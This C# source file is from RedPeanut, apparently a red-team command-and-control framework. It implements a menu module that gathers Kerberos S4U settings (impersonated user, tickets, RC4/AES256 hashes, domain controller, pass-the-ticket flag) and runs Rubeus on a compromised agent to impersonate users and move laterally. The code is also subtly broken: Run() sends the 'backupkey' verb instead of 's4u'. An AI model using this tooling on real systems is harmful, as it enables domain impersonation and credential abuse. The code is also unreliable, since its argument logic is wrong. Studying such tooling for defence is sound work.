//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusS4UManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set user", "Set user" },
            { "set impersonateuser", "Set user to impersonate" },
            { "set tgs", "Set kirbi file or base64 rep" },
            { "set msdsspn", "Set alternative server or service" },
            { "set rc4", "Set rc4" },
            { "set aes256", "Set aes256" },
            { "set altservice", "Set service" },
            { "set dc", "Set set domain controller" },
            { "set domain", "Set domain" },
            { "set ptt", "Set ptt flag" },
            { "set ticket", "Set kirbi file or base64 rep" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "s4u";
        string user;
        string impersonateuser;
        string tgs;
        string msdsspn;
        string rc4;
        string aes256;
        string altservice;
        string dc;
        string domain;
        bool ptt;
        string ticket;

        public RubeusS4UManager()
        {

        }

        public RubeusS4UManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusS4UMenu(input);
            } while (input != "back");
        }

        private void RubeusS4UMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set user":
                            user = GetParsedSetString(input);
                            break;
                        case "set impersonateuser":
                            impersonateuser = GetParsedSetString(input);
                            break;
                        case "set tgs":
                            tgs = GetParsedSetString(input);
                            break;
                        case "set msdsspn":
                            msdsspn = GetParsedSetString(input);
                            break;
                        case "set altservice":
                            altservice = GetParsedSetString(input);
                            break;
                        case "set rc4":
                            rc4 = GetParsedSetString(input);
                            break;
                        case "set aes256":
                            aes256 = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "set ptt":
                            ptt = GetParsedSetBool(input);
                            break;
                        case "set ticket":
                            ticket = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("backupkey");

            if (!string.IsNullOrEmpty(user))
            {
                args.Add("/user:" + user);
            }

            if (!string.IsNullOrEmpty(impersonateuser))
            {
                args.Add("/impersonateuser:" + impersonateuser);
            }

            if (!string.IsNullOrEmpty(tgs))
            {
                args.Add("/tgs:" + tgs);
            }

            if (!string.IsNullOrEmpty(msdsspn))
            {
                args.Add("/msdsspn:" + msdsspn);
            }

            if (!string.IsNullOrEmpty(altservice))
            {
                args.Add("/altservice:" + altservice);
            }

            if (!string.IsNullOrEmpty(rc4))
            {
                args.Add("/rc4:" + rc4);
            }
            
            if (!string.IsNullOrEmpty(aes256))
            {
                args.Add("/aes256:" + aes256);
            }

            if (!string.IsNullOrEmpty(domain))
            {
                args.Add("/domain:" + domain);
            }

            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/dc:" + dc);
            }

            if (ptt)
            {
                args.Add("/ptt");
            }

            if (!string.IsNullOrEmpty(ticket))
            {
                args.Add("/ticket:" + ticket);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }
        
        private void PrintCurrentConfig()
        {
            Console.WriteLine("{0}", modulename);
            Console.WriteLine();
            Console.WriteLine("{0}: {1}", "user", user);
            Console.WriteLine("{0}: {1}", "impersonateuser", impersonateuser);
            Console.WriteLine("{0}: {1}", "tgs", tgs);
            Console.WriteLine("{0}: {1}", "msdsspn", msdsspn);
            Console.WriteLine("{0}: {1}", "rc4", rc4);
            Console.WriteLine("{0}: {1}", "aes256", aes256);
            Console.WriteLine("{0}: {1}", "altservice", altservice);
            Console.WriteLine("{0}: {1}", "dc", dc);
            Console.WriteLine("{0}: {1}", "domain", domain);
            Console.WriteLine("{0}: {1}", "ptt", ptt);
            Console.WriteLine("{0}: {1}", "ticket", ticket);

            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "user", user },
                { "impersonateuser", impersonateuser },
                { "tgs", tgs },
                { "msdsspn", msdsspn },
                { "rc4", rc4 },
                { "aes256", aes256 },
                { "altservice", altservice },
                { "dc", dc },
                { "domain", domain },
                { "ptt", ptt.ToString() },
                { "ticket", ticket }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

